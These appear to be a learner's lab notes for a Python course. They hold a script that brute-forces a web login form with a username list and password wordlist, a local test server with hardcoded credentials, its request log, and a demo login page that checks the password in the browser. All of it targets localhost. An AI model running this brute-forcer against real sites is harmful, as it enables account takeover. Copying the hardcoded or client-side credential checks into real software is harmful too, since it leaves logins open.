___
### Input:
```
import requests
import sys

target = "http://127.0.0.1:8000/login"
usernames = ["admin","hello","Test"]
passwords = "ssh_common_password.txt"
needle = "logged in!"

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username":username,"password": password})
			if needle.encode()in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(),username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}'!".format(username))

```

### Output:
```
┌──(kali㉿kali)-[~/Desktop/Python 101]
└─$ python3 web_bruteforce.py
[X] Attempting user:password -> admin:testingd
[X] Attempting user:password -> hello:testingdmpting user:password -> hello:123455
[X] Attempting user:password -> Test:testingdempting user:password -> Test:123455
        [>>>>>>] Valid password 'testing' found for user 'Test'!
```


### Creating a simple server 
```
#!/usr/bin/env python3
# simple_server.py  -- small HTTP server that handles POST /login
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

HOST = "127.0.0.1"
PORT = 8000

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        # Only handle the /login endpoint
        if self.path != "/login":
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
            return

        # Read and parse form data
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="ignore")
        form = parse_qs(body)

        username = form.get("username", [""])[0]
        password = form.get("password", [""])[0]

        # exact, case-sensitive check requested: username 'Test', password 'testing'
        if username == "Test" and password == "testing":
            # IMPORTANT: return exactly the needle your script looks for
            resp = "logged in!"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(resp.encode("utf-8"))))
            self.end_headers()
            self.wfile.write(resp.encode("utf-8"))
        else:
            resp = "Incorrect username or password."
            self.send_response(401)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(resp.encode("utf-8"))))
            self.end_headers()
            self.wfile.write(resp.encode("utf-8"))

if __name__ == "__main__":
    print(f"Serving HTTP on {HOST}:{PORT}  (GET serves files, POST /login accepts credentials)")
    httpd = HTTPServer((HOST, PORT), Handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server.")
        httpd.server_close()

```

### Output after brute forcing:
```
┌──(kali㉿kali)-[~/Desktop/Python 101]
└─$ python3 server_simple.py 
Serving HTTP on 127.0.0.1:8000  (GET serves files, POST /login accepts credentials)
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:47:24] "POST /login HTTP/1.1" 200 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 401 -
127.0.0.1 - - [10/Nov/2025 09:49:30] "POST /login HTTP/1.1" 200 -
^C
Stopping server.

```


### Creating a web application:
```
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Simple Login</title>
  <style>
    :root { --bg:#0f172a; --card:#111827; --muted:#64748b; --accent:#3b82f6; --ok:#22c55e; --err:#ef4444; }
    * { box-sizing: border-box; }
    body { margin:0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji"; background:linear-gradient(180deg, #0b1220, #0f172a); color:#e5e7eb; min-height:100svh; display:grid; place-items:center; padding:24px; }
    .card { width:100%; max-width:420px; background:rgba(17,24,39,.9); border:1px solid rgba(148,163,184,.15); border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,.35); overflow:hidden; }
    .header { padding:20px 24px; border-bottom:1px solid rgba(148,163,184,.12); display:flex; align-items:center; gap:12px; }
    .logo { height:36px; width:36px; border-radius:10px; background:conic-gradient(from 210deg, var(--accent), #60a5fa, #93c5fd); box-shadow:inset 0 0 0 4px rgba(255,255,255,.08); }
    h1 { font-size:20px; margin:0; }
    .sub { margin:2px 0 0; font-size:12px; color: var(--muted); }
    form { padding:22px 24px; display:grid; gap:14px; }
    label { font-size:13px; color:#cbd5e1; display:block; margin-bottom:6px; }
    input[type="text"], input[type="password"] {
      width:100%; padding:12px 12px; border-radius:10px; border:1px solid rgba(148,163,184,.2);
      background:#0b1220; color:#e5e7eb; outline:none; transition:border .15s ease;
    }
    input:focus { border-color: var(--accent); }
    .row { display:grid; gap:6px; }
    .pw-wrap { position:relative; }
    .pw-toggle { position:absolute; right:10px; top:50%; transform:translateY(-50%); background:none; border:none; color:#94a3b8; cursor:pointer; font-size:12px; padding:6px; }
    .btn { appearance:none; border:none; border-radius:10px; padding:12px 14px; background:var(--accent); color:white; font-weight:600; cursor:pointer; transition:transform .02s ease, filter .15s ease; }
    .btn:active { transform:translateY(1px); }
    .note { font-size:12px; color: var(--muted); text-align:center; }
    .message { margin-top:6px; padding:10px 12px; border-radius:10px; font-size:14px; display:none; }
    .message.ok { background:rgba(34,197,94,.12); border:1px solid rgba(34,197,94,.35); color:#bbf7d0; }
    .message.err { background:rgba(239,68,68,.12); border:1px solid rgba(239,68,68,.35); color:#fecaca; }
    .footer { padding:16px 24px 22px; }
  </style>
</head>
<body>
  <main class="card" role="main">
    <div class="header">
      <div class="logo" aria-hidden="true"></div>
      <div>
        <h1>Login</h1>
        <p class="sub">Use username <strong>Test</strong> and password <strong>testing</strong> (case‑sensitive).</p>
      </div>
    </div>

    <form id="login-form" autocomplete="off" novalidate>
      <div class="row">
        <label for="username">Username</label>
        <input id="username" name="username" type="text" placeholder="Enter username" required />
      </div>

      <div class="row">
        <label for="password">Password</label>
        <div class="pw-wrap">
          <input id="password" name="password" type="password" placeholder="Enter password" required />
          <button type="button" class="pw-toggle" id="pw-toggle" aria-label="Show password">Show</button>
        </div>
      </div>

      <button class="btn" type="submit" id="login-btn">Login</button>
      <p class="note">This demo checks credentials in your browser only.</p>
      <div id="msg" class="message" role="status" aria-live="polite"></div>
    </form>

    <div class="footer">
      <p class="note">Tip: Press Enter to submit.</p>
    </div>
  </main>

  <script>
    (function () {
      const form = document.getElementById('login-form');
      const userEl = document.getElementById('username');
      const passEl = document.getElementById('password');
      const msg = document.getElementById('msg');
      const toggle = document.getElementById('pw-toggle');

      // Toggle password visibility
      toggle.addEventListener('click', function () {
        const showing = passEl.type === 'text';
        passEl.type = showing ? 'password' : 'text';
        toggle.textContent = showing ? 'Show' : 'Hide';
        toggle.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
        passEl.focus();
      });

      function showMessage(text, ok) {
        msg.textContent = text;
        msg.className = 'message ' + (ok ? 'ok' : 'err');
        msg.style.display = 'block';
      }

      form.addEventListener('submit', function (e) {
        e.preventDefault();
        const u = userEl.value.trim();
        const p = passEl.value;

        // Hardcoded check (case-sensitive)
        if (u === 'Test' && p === 'testing') {
          showMessage('Success: logged in!', true);
        } else {
          showMessage('Incorrect username or password.', false);
        }
      });

      // Optional: focus the username on load
      userEl.focus();
    })();
  </script>
</body>
</html>

```

